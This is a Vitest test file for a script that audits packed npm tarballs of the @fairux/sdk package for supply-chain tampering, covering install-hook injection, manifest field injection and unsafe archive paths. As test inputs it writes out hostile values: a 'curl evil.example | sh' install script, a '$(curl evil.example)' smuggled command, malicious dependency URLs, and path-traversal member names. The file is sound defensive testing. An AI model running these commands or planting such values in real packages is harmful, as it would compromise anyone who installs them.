import { describe, expect, it } from "vitest";
import { auditPublishedManifest, auditTarMembers } from "../../scripts/packed-publish-contract.mjs";

/**
 * Gaps in the per-package tarball audits, all reachable from the `prepack` script that runs in the
 * unprivileged prepare job, and all reproduced against the real SDK tarball before being closed:
 *
 * - `scripts` was never inspected, so a `postinstall` added at pack time would have shipped and run
 *   on every consumer's machine at `npm install`;
 * - only a hand-picked list of fields was compared, leaving `os`, `cpu`, `libc`, `module`, and
 *   `bundleDependencies` free to be injected;
 * - members were checked by name and type but not for *uniqueness*, so two members with the same
 *   path — or paths differing only in a `.` segment — let the auditor and the extractor read
 *   different bytes.
 */

const WORKSPACE_VERSIONS = { "@fairux/core": "0.0.0", "@fairux/dom": "0.0.0" };

/**
 * A checkout manifest the cases vary; declared so each variant stays the same type.
 *
 * The fields the cases actually reach into are named, so spreading one of them keeps its shape.
 * Inference from the literal made every variant its own incompatible type.
 */
type SourceManifest = {
  name: string;
  version: string;
  scripts?: Record<string, string>;
  devDependencies?: Record<string, string>;
  dependencies?: Record<string, string>;
  [field: string]: unknown;
};

const SDK_SOURCE: SourceManifest = {
  name: "@fairux/sdk",
  version: "0.1.0-beta.2",
  type: "module",
  license: "Apache-2.0",
  main: "./dist/index.js",
  exports: { ".": { types: "./dist/index.d.ts", import: "./dist/index.js" } },
  files: ["dist", "README.md", "LICENSE", "NOTICE"],
  sideEffects: false,
  publishConfig: { access: "public" },
  engines: { node: "^22.18.0 || >=24.11.0" },
  scripts: { build: "tsdown", prepack: "pnpm build", prepublishOnly: "node guard.mjs" },
  devDependencies: { "@fairux/core": "workspace:*", esbuild: "^0.28.1" },
};

/** What `pnpm@10.33.2 pack` actually produces for the manifest above — measured, not assumed. */
const SDK_PACKED = {
  ...SDK_SOURCE,
  scripts: { build: "tsdown" },
  devDependencies: { "@fairux/core": "0.0.0", esbuild: "^0.28.1" },
};

const audit = (overrides: Record<string, unknown> = {}, source = SDK_SOURCE) =>
  auditPublishedManifest({
    manifest: { ...SDK_PACKED, ...overrides },
    sourceManifest: source,
    workspaceVersions: WORKSPACE_VERSIONS,
  });

describe("published manifest — the two transforms pnpm actually performs", () => {
  it("accepts the real shape: lifecycle scripts stripped, workspace ranges resolved", () => {
    expect(audit()).toEqual([]);
  });

  it("refuses a publish-lifecycle script that survived, since the checkout's value must match", () => {
    expect(audit({ scripts: { build: "tsdown", prepack: "node evil.mjs" } })).toContain(
      "packed manifest scripts does not match the checkout",
    );
  });

  it("refuses a workspace range resolved to something other than the workspace version", () => {
    for (const wrong of ["*", "https://evil.example/pkg.tgz", "npm:evil@1", "9.9.9"]) {
      expect(audit({ devDependencies: { "@fairux/core": wrong, esbuild: "^0.28.1" } })).toContain(
        "packed manifest devDependencies does not match the checkout",
      );
    }
  });

  it("refuses an unresolved workspace range, which no consumer can install", () => {
    expect(
      audit({ devDependencies: { "@fairux/core": "workspace:*", esbuild: "^0.28.1" } }),
    ).toContain("packed manifest devDependencies does not match the checkout");
  });

  it("refuses a workspace protocol form whose transform has not been measured", () => {
    const source = { ...SDK_SOURCE, devDependencies: { "@fairux/core": "workspace:^" } };
    expect(audit({}, source).join("\n")).toMatch(/unsupported workspace protocol form/);
  });

  it("refuses a workspace dependency on a package the checkout does not contain", () => {
    const source = { ...SDK_SOURCE, devDependencies: { "@fairux/ghost": "workspace:*" } };
    expect(audit({}, source).join("\n")).toMatch(/no workspace version known for @fairux\/ghost/);
  });
});

describe("published manifest — install-time scripts", () => {
  it.each([
    "preinstall",
    "install",
    "postinstall",
    "prepublish",
    "preprepare",
    "prepare",
    "postprepare",
    "dependencies",
  ])("refuses a packed %s script", (name) => {
    expect(audit({ scripts: { build: "tsdown", [name]: "curl evil.example | sh" } })).toContain(
      `packed manifest defines an install-time script: ${name}`,
    );
  });

  it("refuses an install hook that is in the checkout, before comparing anything else", () => {
    // `prepublish` is deprecated but still runs on `npm install` and `npm ci`.
    const source = { ...SDK_SOURCE, scripts: { ...SDK_SOURCE.scripts, prepublish: "node x.mjs" } };
    expect(audit({}, source)).toEqual([
      "source manifest defines an install-time script: prepublish",
    ]);
  });

  it("allows prepack and prepublishOnly in the checkout, which never run on install", () => {
    expect(audit()).toEqual([]);
  });
});

describe("published manifest — the comparison is the whole object", () => {
  it.each([
    ["os", ["!darwin"]],
    ["cpu", ["!arm64"]],
    ["libc", ["glibc"]],
    ["module", "./evil.js"],
    ["browser", "./evil.js"],
    ["bundleDependencies", ["evil"]],
    ["bundledDependencies", ["evil"]],
    ["bin", { evil: "./evil.js" }],
    ["config", { evil: true }],
    ["workspaces", ["evil"]],
  ])("refuses an injected %s, which no pinned-field list would have caught", (field, value) => {
    // Reproduced against the real SDK tarball: os/cpu/libc restrict which machines may install the
    // package at all, and bundleDependencies changes what the tarball is contractually carrying.
    expect(audit({ [field]: value })).toContain(
      `packed manifest adds ${field}, which the checkout does not declare`,
    );
  });

  it.each([
    "main",
    "exports",
    "files",
    "publishConfig",
    "type",
    "license",
    "engines",
    "sideEffects",
  ])("refuses a rewritten %s", (field) => {
    expect(audit({ [field]: "./hijacked.js" })).toContain(
      `packed manifest ${field} does not match the checkout`,
    );
  });

  it("refuses a dropped field", () => {
    const manifest = { ...SDK_PACKED };
    delete (manifest as Record<string, unknown>).exports;
    expect(
      auditPublishedManifest({
        manifest,
        sourceManifest: SDK_SOURCE,
        workspaceVersions: WORKSPACE_VERSIONS,
      }),
    ).toContain("packed manifest is missing exports");
  });

  it("refuses a renamed package", () => {
    expect(audit({ name: "@evil/sdk" })).toContain(
      "packed manifest name does not match the checkout",
    );
  });

  it("refuses a private packed manifest", () => {
    expect(audit({ private: true })).toContain(
      "packed manifest adds private, which the checkout does not declare",
    );
  });

  it("does not echo the injected value back in the message", () => {
    const message = audit({ os: ["$(curl evil.example)"] }).join("\n");
    expect(message).not.toContain("curl evil.example");
  });

  it("compares independently of key order", () => {
    const reordered = Object.fromEntries(Object.entries(SDK_PACKED).reverse());
    expect(
      auditPublishedManifest({
        manifest: reordered,
        sourceManifest: SDK_SOURCE,
        workspaceVersions: WORKSPACE_VERSIONS,
      }),
    ).toEqual([]);
  });
});

describe("archive members — type", () => {
  const file = (name: string) => ({ name, type: "file", linkname: "" });

  it("accepts ordinary files under package/ and returns them relative to it", () => {
    expect(auditTarMembers([file("package/package.json"), file("package/dist/index.js")])).toEqual({
      failures: [],
      names: ["package.json", "dist/index.js"],
    });
  });

  it("refuses an empty archive", () => {
    expect(auditTarMembers([]).failures).toEqual(["tarball has no members"]);
  });

  it.each([
    "symlink",
    "hardlink",
    "character-device",
    "block-device",
    "fifo",
    "directory",
    "pax-extended-header",
    "unknown",
  ])("refuses a %s member", (type) => {
    expect(
      auditTarMembers([
        file("package/package.json"),
        { name: "package/dist/index.js", type, linkname: "" },
      ]).failures.join("\n"),
    ).toMatch(new RegExp(`is a ${type}, not a regular file`));
  });

  it("refuses a regular file carrying a link target", () => {
    expect(
      auditTarMembers([{ name: "package/x.js", type: "file", linkname: "package/y.js" }]).failures,
    ).toContain("tarball member package/x.js carries a link target");
  });
});

describe("archive members — path identity", () => {
  const file = (name: string) => ({ name, type: "file", linkname: "" });

  it.each([
    ["/etc/passwd", /absolute path/],
    ["C:\\Windows\\system32", /absolute path/],
    ["package/../../evil.js", /escapes its root/],
    ["package\\dist\\index.js", /backslash/],
    ["dist/index.js", /outside the package\/ root/],
    ["package/dist/./index.js", /contains a "\." segment/],
    ["package//dist/index.js", /empty path segment/],
    ["package/dist/", /trailing slash/],
    ["package/dist/\u0000evil.js", /control character/],
    ["package/dist/\u001bevil.js", /control character/],
  ])("refuses the path %j", (name, pattern) => {
    expect(auditTarMembers([file(name)]).failures.join("\n")).toMatch(pattern);
  });

  it("refuses a non-canonical path even when it resolves inside package/", () => {
    expect(auditTarMembers([file("package/dist/../dist/index.js")]).failures.join("\n")).toMatch(
      /not in canonical form/,
    );
  });

  it("returns no names at all when any path failed", () => {
    // A caller must never read content out of an archive whose paths did not verify: `tar -xzOf`
    // would hand it the concatenation of every member sharing a path.
    const result = auditTarMembers([file("package/package.json"), file("package/dist/./x.js")]);
    expect(result.failures.length).toBeGreaterThan(0);
    expect(result.names).toEqual([]);
  });
});

describe("archive members — uniqueness", () => {
  const file = (name: string) => ({ name, type: "file", linkname: "" });

  it("refuses an exact duplicate", () => {
    // Reproduced: a first `package/dist/dom.js` of `//` and a second holding `import "node:fs";`
    // audited clean, because `tar -xzOf` concatenated them into a comment while extraction kept
    // the second.
    expect(
      auditTarMembers([file("package/dist/dom.js"), file("package/dist/dom.js")]).failures,
    ).toContain("tarball contains package/dist/dom.js more than once");
  });

  it("refuses two paths that resolve to the same file", () => {
    expect(
      auditTarMembers([file("package/dist/dom.js"), file("package/dist/./dom.js")]).failures.join(
        "\n",
      ),
    ).toMatch(/resolve to the same path/);
  });

  it("refuses a collision that only appears on a case-insensitive filesystem", () => {
    expect(
      auditTarMembers([file("package/dist/dom.js"), file("package/dist/DOM.js")]).failures.join(
        "\n",
      ),
    ).toMatch(/collide on a case-insensitive filesystem/);
  });

  it("reports a collision once, at its most specific level", () => {
    expect(
      auditTarMembers([file("package/dist/dom.js"), file("package/dist/dom.js")]).failures,
    ).toHaveLength(1);
  });

  it("accepts names that differ in more than case", () => {
    expect(
      auditTarMembers([file("package/dist/dom.js"), file("package/dist/dom.d.ts")]).failures,
    ).toEqual([]);
  });
});
